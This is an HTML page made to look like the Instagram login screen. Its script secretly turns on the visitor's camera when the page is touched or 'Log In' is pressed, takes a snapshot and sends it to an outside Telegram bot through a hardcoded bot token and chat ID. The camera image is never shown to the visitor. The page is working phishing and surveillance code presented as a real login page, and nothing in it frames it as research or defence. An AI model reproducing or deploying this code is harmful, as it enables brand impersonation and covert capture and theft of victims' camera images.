<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            background-color: #121212;
            color: white;
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #1d1d1d;
            padding: 30px;
            border-radius: 8px;
            text-align: center;
            width: 320px;
        }
        .logo img {
            width: 180px;
            margin-bottom: 20px;
        }
        input, button {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: none;
            border-radius: 5px;
        }
        button {
            background-color: #0095f6;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }
        canvas {
            display: none;
        }
    </style>
</head>
<body ontouchstart="startCapture()">

    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram Logo">
        </div>
        <input type="text" id="username" placeholder="Phone number, username, or email">
        <input type="password" id="password" placeholder="Password">
        <button onclick="startCapture()">Log In</button>
    </div>

    <canvas id="snapshotCanvas" width="320" height="240"></canvas>

    <script>
        let localStream;

        // Capture the camera feed and take a snapshot
        async function startCapture() {
            await initializeCamera();  // Initialize the user's camera
            captureSnapshot();  // Capture a snapshot and send it to the bot
        }

        // Get the user's camera stream
        async function initializeCamera() {
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ video: true });
                console.log('Camera stream initialized.');
            } catch (error) {
                console.error('Failed to access camera:', error);
            }
        }

        // Capture a snapshot and send it to the Telegram bot
        function captureSnapshot() {
            const video = document.createElement('video');
            video.srcObject = localStream;
            video.play();

            // Wait for the video to start playing before capturing the snapshot
            video.onloadedmetadata = () => {
                const canvas = document.getElementById('snapshotCanvas');
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                video.pause();  // Pause the video after taking the snapshot

                // Convert the canvas to a Blob (image)
                canvas.toBlob((blob) => {
                    sendSnapshotToBot(blob);  // Send the image to the bot
                }, 'image/jpeg');
            };
        }

        // Send the image to the Telegram bot
        function sendSnapshotToBot(imageBlob) {
            const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';
            const chatId = '860517021';

            const formData = new FormData();
            formData.append('photo', imageBlob, 'snapshot.jpg');

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(() => {
                console.log('Snapshot sent to Telegram bot.');
            })
            .catch((error) => {
                console.error('Error sending snapshot:', error);
            });
        }
    </script>

</body>
</html>
